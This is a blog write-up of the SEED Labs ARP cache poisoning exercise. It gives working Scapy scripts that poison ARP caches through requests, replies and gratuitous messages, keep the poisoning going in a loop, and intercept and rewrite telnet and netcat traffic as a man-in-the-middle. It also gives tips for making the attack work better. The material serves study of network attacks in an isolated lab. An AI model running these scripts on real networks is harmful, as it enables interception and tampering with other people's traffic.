---
layout: post
title: ARP Cache Attack
categories: [scapy, sniffing]
---

When a computer wants to send data within a network (not across i.e. via a router), it usually makes use of the NIC MAC address to send such data.
Every computer keeps a record of IP-to-MAC-address mapping. This is called the `ARP cache`. It is through the help of the ARP cache that the computer knows which NIC to send data meant for a particular IP address. A computer populates (stores an entry) its ARP cache when it receives an arp request.

<details>
<summary><b>SeedLabs: ARP Cache Poisoning Attack Lab</b></summary>
<div markdown="1">

- [ARP Cache Poisoning Attack Lab](https://seedsecuritylabs.org/Labs_20.04/Files/ARP_Attack/ARP_Attack.pdf)

___
</div></details>


#### Tools used in this lab
- _Scapy: scapy is a very powerful tool written in python for packet manipulation_
when spoofing requests with scapy, any header field you do not set would be set by scapy.

```
context
host A: this is victim 1 (10.9.0.5)
host B: this is victim 2 (10.9.0.6)
host C: this is our attacking machine  (10.9.0.105)
all three hosts are on the same LAN
```

<br>

### ARP cache poisoning using ARP requests
When sending an ARP request, the following are the important fields to spoof in the ARP header:
- `psrc`: this specifies where the `ARP request` is originating from
- `pdst`: this specifies where the `ARP request` is going to
- `op`: this specifies whether it is an `ARP request` or an `ARP reply`
- `hwsrc`: this specifies the MAC Address of the host where the `ARP request` is originating from

So to perform a cache poisoning attack, you need to set `psrc` to the host-ip whose traffic you want to intercept and set `hwsrc` to your machine MAC address.
What this means is that in the arp address table of the host you're attacking, `psrc` would be bound to `hwsrc`

The below code achieves this

```python
#!/usr/bin/env python3
import sys
from scapy.all import *

def main():
    if len(sys.argv) != 3:
        usage()
        sys.exit(2)
    psrc_ = sys.argv[1]
    pdst_ = sys.argv[2]
    E = Ether(dst = 'ff:ff:ff:ff:ff:ff')
    A = ARP(psrc = psrc_, pdst = pdst_, op = 1)
    sendp(E/A, verbose=0)
    print(f'sent ARP request to {pdst_}')
    
def usage():
    print("Usage: ./arp-request.py <src-ip> <dst-ip>\
    \n\tsrc-ip: IP address of the host you want to map to your MAC address\
    \n\tdst-ip: Ip address of the host whose ARP cache you want to poison\n")
    
    
if __name__ == '__main__':
    main()
```

Executing the above code on `host c` against `host B` and observing the traffic on Wireshark, I observed the following
- the first entry is a broadcast message originating from `host C` asking for the host who has `host B`'s IP address
- the second entry is a reply from `host A`

Taking a look at `host A` ARP table after the attack, it is observed that `host B`'s IP address is mapped to `host C`'s MAC address.

<br>

### ARP cache poisoning using ARP replies
When sending an ARP reply, the following are the important fields to spoof in the ARP header:
- `psrc`: this specifies where the `ARP reply` is originating from
- `pdst`: this specifies where the `ARP reply` is going to
- `op`: this specifies whether it is an `ARP request` or an `ARP reply`
- `hwdst`: this specifies the MAC Address of the host where the `ARP reply` is going to

Below are my observations during the lab exercise:
-  When `host B`'s IP is already in `host A`'s cache, `host A` updates its arp cache with the information gotten from the `ARP reply`.
-  When `host B`'s IP is not already in `host A`'s cache, nothing happens. No entry is added.

The tests were run using the below code:

```python
#!/usr/bin/env python3

import sys
from scapy.all import *

def main():
    if len(sys.argv) != 4:
        usage()
        sys.exit(2)
    psrc_ = sys.argv[1]
    pdst_ = sys.argv[2]
    hwdst_ = sys.argv[3]
    E = Ether(dst = hwdst_)
    A = ARP(psrc = psrc_, pdst = pdst_, op = 2, hwdst = hwdst_)
    sendp(E/A, verbose=0)
    print(f'sent ARP reply to {pdst_}')
    
def usage():
    print("Usage: ./arp-reply.py <src-ip> <dst-ip> <dst-mac>\
    \n\tsrc-ip: IP address of the host you want to map to your MAC address\
    \n\tdst-ip: Ip address of the host whose ARP cache you want to poison\
    \n\tdst-mac: The MAC address of the host whose ARP cache you want to poison\n")
    
    
if __name__ == '__main__':
    main()
```

<br>

### ARP cache poisoning using ARP gratuitous message
An ARP gratuitous message is a type of `arp request` that a host sends out to other machines so that they can update their arp cache with the new information they receive. The following characterizes arp poisoning via arp gratuitous message:
- the destination MAC address in the `Ethernet` header is set to `ff:ff:ff:ff:ff:ff`
- the source IP address in the `ARP` header is set to the IP address of the host you want to spoof
- the destination IP address in the `ARP` header is also set to the IP address of the host you want to spoof
- the destination MAC address in the `ARP` header is set to `ff:ff:ff:ff:ff:ff`
- the operation is set to 1 to indicate an `arp request`

The below code demonstrates arp cache poisoning via ARP gratuitous messages

```python
#!/usr/bin/env python3

import sys
from scapy.all import *

def main():
    # Ensure correct usage
    if len(sys.argv) != 2:
        usage()
        sys.exit(2)
        
    # unpack values
    psrc_ = sys.argv[1]
    pdst_ = sys.argv[1]
    
    # construct packet
    E = Ether(dst = 'ff:ff:ff:ff:ff:ff')
    A = ARP(psrc = psrc_, pdst = pdst_, op = 1, hwdst = 'ff:ff:ff:ff:ff:ff')
    sendp(E/A, verbose=0)
    print(f'sent gratituos ARP request')
    
def usage():
    print("Usage: ./arp-gratuitous.py <src-ip>\
    \n\tsrc-ip: IP address of the host you want to map to your MAC address\n")
    
    
if __name__ == '__main__':
    main()
```

##### Side notes
- an `arp request` will always add an entry to the arp cache of the destination. If an entry already exists, an `arp request` causes the destination host to update the entry in its arp cache.
- an `arp reply` will never add an entry to the arp cache of the destination. However, if an entry already exists, an `arp reply` causes the destination host to update the entry in its arp cache.
- `arp gratuitous message` just like an `arp reply` will never add an entry to the arp cache of the destination. However, if an entry already exists, the `gratuitous arp message` causes the destination host to update the entry in its arp cache.

<br>

### MITM Attack on Telnet using ARP Cache Poisoning
For this attack, I chose to carry out initial cache poisoning via arp requests and then sustain the poisoned cache via gratuitous messages. Below is the code used:

```python
#!/usr/bin/env python3

import sys, time
from scapy.all import *

def main():
    # Ensure correct usage
    if len(sys.argv) != 3:
        usage()
        sys.exit(2)
        
    # unpack values
    victim_1 = sys.argv[1]
    victim_2 = sys.argv[2]
    
    # construct packet for initial poisoning via arp request
    sendp(Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(psrc = victim_1, pdst = victim_2, op = 1), verbose = 0)
    sendp(Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(psrc = victim_2, pdst = victim_1, op = 1), verbose = 0)
    print('Performed initial poisoning...')
    time.sleep(5)
    
    # ensure continuous poisoning via arp gratuitous messages
    while True:
        print('Re-arming arp poisoning...')
        sendp(Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(psrc = victim_1, pdst = victim_1, op = 1), verbose = 0)
        sendp(Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(psrc = victim_2, pdst = victim_2, op = 1), verbose = 0)
        time.sleep(5)
    
def usage():
    print("Usage: ./arp-request.py <victim1-ip> <victim2-ip>\
    \n\tvictim1-ip: IP address of victim 1\
    \n\tvictim2-ip: IP address of victim 2\n")
    
    
if __name__ == '__main__':
    main()
```

***arp cache for `host A`***

![arp-poison-hostA](https://github.com/iukadike/blog/assets/58455326/af7444dc-11ee-4052-9984-79bedc8af5d9)

***arp cache for `host B`***

![arp-poison-hostB](https://github.com/iukadike/blog/assets/58455326/24a8c5a5-710b-4d9f-94ce-3c25cc0de489)

After performing the attack and ensuring that it is successful, the following are observed:
- when IP forwarding is disabled on `host C` (`sysctl net.ipv4.ip_forward=0`) and `host A` pings `host B`, `host A` does not receive any response to the ping request. When the traffic is observed in Wireshark, it is noticed that there is indeed a ping request that originates from `host A` but no accompanying ping reply.
- when IP forwarding is enabled on `host C` (`sysctl net.ipv4.ip_forward=1`) and `host A` pings `host B`, `host A` receives a response to the ping request. The reply comes from `host C` and is marked `redirect` with the next hop being `host B`. When the traffic is observed in Wireshark, it is noticed that there is indeed a ping request that originates from `host A` and an accompanying ping reply from `host B`. There is also an `ICMP redirect` from `host C`. However, looking closely at the captured traffic, there are two requests, two replies, and two redirects:
  - the first request has `host A`'s MAC address as the source address in the Ethernet header and `host C`'s MAC address as the destination address in the Ethernet header
  - the second request has `host C`'s MAC address as the source address in the Ethernet header and `host B`'s MAC address as the destination address in the Ethernet header
  - the first reply has `host B`'s MAC address as the source address in the Ethernet header and `host C`'s MAC address as the destination address in the Ethernet header
  - the second reply has `host C`'s MAC address as the source address in the Ethernet header and `host A`'s MAC address as the destination address in the Ethernet header
  - the first redirect has `host C`'s MAC address as the source address in the Ethernet header and `host B`'s MAC address as the destination address in the Ethernet header
  - the second redirect has `host C`'s MAC address as the source address in the Ethernet header and `host A`'s MAC address as the destination address in the Ethernet header.

The next step involves setting up a telnet connection between `host A` and `host B`, intercepting the traffic on `host C` and spoofing it. To successfully perform the MITM attack, you have to turn off IP routing in `host C`. This means you are fully responsible for the traffic you pass between `host A` and `host C`.

```python
#!/usr/bin/env python3
from scapy.all import *

iface_ = 'eth0'
hostA = '10.9.0.5'  #IP address for host A
hostB = '10.9.0.6'  #IP address for host A
port = '23'

def main():
    #########################################################################
    # Here we do not want to capture any traffic that our program generates #
    #########################################################################
    filter_ = f'tcp port {port} && (not ether src 02:42:0a:09:00:69)'
    sniff(iface = iface_, filter = filter_, prn = spoof_pkt)
    
def spoof_pkt(pkt):
    if pkt[IP].src == hostA and pkt[IP].dst == hostB:
        # save a copy of the captured packet by first type casting it as binary data
        # then initialize it as an IP packet
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)              # force recalculation of IP checksum
        del(newpkt[TCP].payload)        # delete existing payload
        del(newpkt[TCP].chksum)         # force recalculation of TCP checksum
        
        # Check if payload exists and spoof
        if pkt[TCP].payload:
            data = (pkt[TCP].payload.load).decode()     # decodes the payload so we can work on it
            if (data == '\r\x00') or (data == '\r\n'):
                send(newpkt / Raw(load = data), verbose=0)
            else:
                newdata = 'Z'                           # replaces the payload with 'Z'
                send(newpkt / Raw(load = newdata), verbose=0)
        else:
            send(newpkt, verbose=0)
    elif pkt[IP].src == hostB and pkt[IP].dst == hostA:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        
        # Check for payload and replace
        if pkt[TCP].payload:
            data = (pkt[TCP].payload.load).decode()
            newdata = data
            send(newpkt / Raw(load = data), verbose=0)
        else:
            send(newpkt, verbose=0)
                      
                
if __name__ == '__main__':
    main()
```

***mitm attack***

![telnet-mitm](https://github.com/iukadike/blog/assets/58455326/ac510d13-36c4-4aa4-8912-02f16e0c57c8)

##### side notes:
- Though I made use of arp gratuitous messages during the attack, it should be used sparingly as every host on the network will receive the message and update its arp cache accordingly.
  - A better approach is to use arp replies that target the specific hosts you want to attack.
- Also, the re-ARP time I chose was too much, as such the fake entries would get replaced from time to time; a smaller time would be ideal.

<br>

###  MITM Attack on Netcat using ARP Cache Poisoning
Unlike the telnet MITM attack where the spoofing happens one-way, in this attack, the spoofing happens both ways.

```python
#!/usr/bin/env python3
import re
from scapy.all import *

iface_ = 'eth0'
hostA = '10.9.0.5'  #IP address for host A
hostB = '10.9.0.6'  #IP address for host A
port = '9090'       #netcat port

def main():   
    filter_ = f'tcp port {port} && (not ether src 02:42:0a:09:00:69)'
    sniff(iface = iface_, filter = filter_, prn = spoof_pkt)
    
def spoof_pkt(pkt):
    if pkt[IP].src == hostA and pkt[IP].dst == hostB:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        
        # Check for payload and replace first occurence of my name with 'a'
        if pkt[TCP].payload:
            data = (pkt[TCP].payload.load).decode().lower()
            newdata = re.sub('ifeanyi', 'aaaaaaa', data, 1)
            send(newpkt / Raw(load = newdata), verbose=0)
        else:
            send(newpkt, verbose=0)
    elif pkt[IP].src == hostB and pkt[IP].dst == hostA:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        
        # Check for payload and replace first occurence of my name with 'b'
        if pkt[TCP].payload:
            data = (pkt[TCP].payload.load).decode().lower()
            newdata = re.sub('ifeanyi', 'bbbbbbb', data, 1)
            send(newpkt / Raw(load = newdata), verbose=0)
        else:
            send(newpkt, verbose=0)
         
                
if __name__ == '__main__':
    main()
```

***mitm nc `host A`***

![hostA -nc-mitm png](https://github.com/iukadike/blog/assets/58455326/932bce82-fccf-455f-9b63-2afda48e4a19)

***mitm nc `host B`***

![hostB -nc-mitm](https://github.com/iukadike/blog/assets/58455326/aad5532d-1589-4469-9e41-c5a40797dad3)

##### side note:
- when there is a payload, the psh flag is set.
- you need to convert the packet to bytes because, in the end, you want to make a copy. Since the packet is an array, assigning it directly will not create a copy.

<br>

Thanks for reading...
